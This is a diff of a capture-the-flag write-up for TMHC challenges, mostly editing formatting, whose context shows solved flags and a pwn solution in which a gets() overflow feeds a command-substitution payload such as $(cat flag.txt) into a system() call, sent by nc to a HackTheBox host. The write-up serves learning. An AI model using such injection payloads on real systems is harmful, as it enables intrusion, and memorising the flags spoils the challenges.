@@ -31,7 +31,7 @@ while u'Problem:' in x[1]:
         print (flag)
 ```
 
-```bash
+```shell
 bread@sticks:~#python3 solve.py
 TMHC{}
 ```
@@ -49,8 +49,9 @@ and we have the flag:
 - Unzip using the password and get the flag
 
 
-    `TMHC{1_kn0w_d35cr1pt1v3_n0t4t10n}`
-    
+    `TMHC{1_kn0w_d35cr1pt1v3_n0t4t10n}`   
+
+
 ## Beeeep_Beeeep - Category: Misc
 
 - Listened to the audio and recognised it as a video from SmarterEveryDay
@@ -60,6 +61,7 @@ and we have the flag:
 
 
     `TMHC{0f5ee61ef3fbb4bb066df8c286ec84b07a7a5d95}`
+    
     
 ## overdosed - Category: PWN
 
@@ -114,8 +116,8 @@ undefined8 main(undefined4 param_1,undefined8 param_2){
 ```
 
 From here we can see a couple of things:
- - `first_chall()`
- - `local_98` is the name variable, `local_3c` is length and they are used in the `name_check` function.
+ - ```first_chall()```
+ - ```local_98``` is the name variable, ```local_3c``` is length and they are used in the ```name_check``` function.
  - If that function returns a `0`, then our name variable is used in the string `"/bin/echo Hello \"%s\""` which is an argument to `system()`.
 
 This means we can probably command inject, but first we need to see what `first_chall` and `name_check` do.
@@ -160,7 +162,7 @@ Ok lets read the code:
     - `local_28 == 0x7869704851` or `QHpix`
 - For no apparent reason a `gets(local_68)` call exists
     - `local_68` is not used after this point.
-    -  `local_68 [64]`, length is 64.
+    - `local_68 [64]`, length is 64.
     - `gets()` is a known vulnerable function, used in BOF attacks
 
 This means we have a BOF, and with it (depending on the stack layout) we can control the environment variable (`name`).
@@ -235,7 +237,7 @@ A couple of interesting things to note:
     - `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")`
 - We then call `name` using `$name`
 
-```bash
+```shell
 bread@sticks:~# ./overdosed 
 Could you tell me about yourself?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")
@@ -246,7 +248,7 @@ Hello bread
 
 yep that works, guess the stack is set up how I expected. lets try it on the server.
 
-```bash
+```shell
 bread@sticks:~# nc docker.hackthebox.eu 1337
 Could you tell me about yourself?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(cat flag.txt)
@@ -411,7 +413,7 @@ print (f"TMHC{'{'+''.join(serial)+'}'}")
 ```
 
 and we get the flag:
-```bash
+```shell
 bread@sticks:~# python solve.py
 TMHC{5yjzx3d265gb7j}
 ```
